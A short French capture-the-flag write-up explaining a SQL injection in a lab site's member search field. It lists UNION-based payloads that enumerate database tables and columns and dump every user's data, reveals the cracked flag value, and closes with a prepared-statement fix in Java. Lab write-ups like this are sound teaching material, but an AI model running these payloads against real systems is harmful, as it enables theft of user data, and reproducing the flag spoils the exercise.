
#  Explications

  

En inspectant la page : /?page=member

  

Le champ de recherche **id** est sensible aux injections SQL.

  

Si on entre `1 OR 1=1` comme id. La liste de tout les utilisateurs va être affiché.

    1 OR 1=1 union select null, concat(table_name) from information_schema.tables where table_schema=database()

  Le nom de table table est **users**.
  
  

    1 OR 1=1 union select null, concat(column_name) from information_schema.columns where table_schema=database()
Grâce à cette requête, on a la liste de toute les colonnes de la table users

		1 OR 1=1 union select null, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users
Affiche toutes les données de tout  les utilisateurs.

Notre flag est contenu dans la colonne countersign de l'utilisateur GetThe Flag.

5ff9d0165b4f92b14994e5c685cdce28

md5 vers texte = FortyTwo
texte vers sha256 = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

#  Protection

En préparant ses requêtes

  

Exemple:

```java

String  sql  =  "SELECT * FROM users WHERE email = ?";

  

// Run the query, passing the 'email' parameter value...

ResultSet  results  = stmt.executeQuery(sql, email);

```